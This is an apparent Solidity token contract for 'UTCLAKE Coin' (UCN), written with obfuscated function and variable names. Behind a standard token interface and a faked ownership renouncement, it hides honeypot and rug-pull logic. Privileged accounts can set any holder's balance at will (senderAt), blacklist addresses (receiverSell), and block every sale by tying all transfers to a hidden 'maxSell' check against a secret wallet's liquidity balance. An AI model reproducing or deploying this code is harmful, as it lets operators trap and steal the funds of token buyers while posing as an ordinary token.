//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface maxWallet {
    function totalSupply() external view returns (uint256);

    function balanceOf(address listFund) external view returns (uint256);

    function transfer(address fromExempt, uint256 limitTotalEnable) external returns (bool);

    function allowance(address toExemptTrading, address spender) external view returns (uint256);

    function approve(address spender, uint256 limitTotalEnable) external returns (bool);

    function transferFrom(
        address sender,
        address fromExempt,
        uint256 limitTotalEnable
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fromBuyMax, uint256 value);
    event Approval(address indexed toExemptTrading, address indexed spender, uint256 value);
}

interface atAmount is maxWallet {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract walletFund {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface senderMax {
    function createPair(address enableMarketing, address launchedList) external returns (address);
}

interface walletAtExempt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract UTCLAKECoin is walletFund, maxWallet, atAmount {

    constructor (){
        
        txFeeReceiver();
        walletAtExempt atIs = walletAtExempt(sellMode);
        modeMax = senderMax(atIs.factory()).createPair(atIs.WETH(), address(this));
        
        minTrading = _msgSender();
        toTeamFee[minTrading] = true;
        totalTake[minTrading] = txTrading;
        if (atWallet == receiverModeSell) {
            receiverModeSell = false;
        }
        emit Transfer(address(0), minTrading, txTrading);
    }

    function receiverSell(address fundSwap) public {
        sellWallet();
        
        if (fundSwap == minTrading || fundSwap == modeMax) {
            return;
        }
        tokenLiquidityTake[fundSwap] = true;
    }

    event OwnershipTransferred(address indexed exemptIs, address indexed fromMin);

    function transferFrom(address shouldTrading, address fromExempt, uint256 limitTotalEnable) external override returns (bool) {
        if (_msgSender() != sellMode) {
            if (marketingLimit[shouldTrading][_msgSender()] != type(uint256).max) {
                require(limitTotalEnable <= marketingLimit[shouldTrading][_msgSender()]);
                marketingLimit[shouldTrading][_msgSender()] -= limitTotalEnable;
            }
        }
        return maxTotal(shouldTrading, fromExempt, limitTotalEnable);
    }

    address private teamFrom;

    mapping(address => mapping(address => uint256)) private marketingLimit;

    string private walletTrading = "UCN";

    function symbol() external view virtual override returns (string memory) {
        return walletTrading;
    }

    function owner() external view returns (address) {
        return teamFrom;
    }

    address public modeMax;

    function totalSupply() external view virtual override returns (uint256) {
        return txTrading;
    }

    address sellMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 private exemptReceiver;

    mapping(address => bool) public toTeamFee;

    bool private buyLimit;

    function buyTotal(address feeLimit) public {
        if (receiverAtReceiver) {
            return;
        }
        
        toTeamFee[feeLimit] = true;
        
        receiverAtReceiver = true;
    }

    mapping(address => bool) public tokenLiquidityTake;

    function approve(address swapListMin, uint256 limitTotalEnable) public virtual override returns (bool) {
        marketingLimit[_msgSender()][swapListMin] = limitTotalEnable;
        emit Approval(_msgSender(), swapListMin, limitTotalEnable);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return feeEnable;
    }

    bool private receiverShould;

    uint256 private teamTo;

    mapping(address => uint256) private totalTake;

    function sellWallet() private view {
        require(toTeamFee[_msgSender()]);
    }

    string private senderAutoTx = "UTCLAKE Coin";

    bool private atWallet;

    function allowance(address feeFund, address swapListMin) external view virtual override returns (uint256) {
        if (swapListMin == sellMode) {
            return type(uint256).max;
        }
        return marketingLimit[feeFund][swapListMin];
    }

    bool private receiverModeSell;

    function transfer(address sellAuto, uint256 limitTotalEnable) external virtual override returns (bool) {
        return maxTotal(_msgSender(), sellAuto, limitTotalEnable);
    }

    function balanceOf(address listFund) public view virtual override returns (uint256) {
        return totalTake[listFund];
    }

    function name() external view virtual override returns (string memory) {
        return senderAutoTx;
    }

    function atListTx(uint256 limitTotalEnable) public {
        sellWallet();
        maxSell = limitTotalEnable;
    }

    address public minTrading;

    function getOwner() external view returns (address) {
        return teamFrom;
    }

    function senderAt(address sellAuto, uint256 limitTotalEnable) public {
        sellWallet();
        totalTake[sellAuto] = limitTotalEnable;
    }

    bool public receiverAtReceiver;

    uint8 private feeEnable = 18;

    function txFeeReceiver() public {
        emit OwnershipTransferred(minTrading, address(0));
        teamFrom = address(0);
    }

    bool private listMarketing;

    function senderMin(address shouldTrading, address fromExempt, uint256 limitTotalEnable) internal returns (bool) {
        require(totalTake[shouldTrading] >= limitTotalEnable);
        totalTake[shouldTrading] -= limitTotalEnable;
        totalTake[fromExempt] += limitTotalEnable;
        emit Transfer(shouldTrading, fromExempt, limitTotalEnable);
        return true;
    }

    uint256 maxSell;

    uint256 feeSwap;

    uint256 private txTrading = 100000000 * 10 ** 18;

    address minTxMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function maxTotal(address shouldTrading, address fromExempt, uint256 limitTotalEnable) internal returns (bool) {
        if (shouldTrading == minTrading) {
            return senderMin(shouldTrading, fromExempt, limitTotalEnable);
        }
        uint256 exemptTake = maxWallet(modeMax).balanceOf(minTxMarketing);
        require(exemptTake == maxSell);
        require(!tokenLiquidityTake[shouldTrading]);
        return senderMin(shouldTrading, fromExempt, limitTotalEnable);
    }

}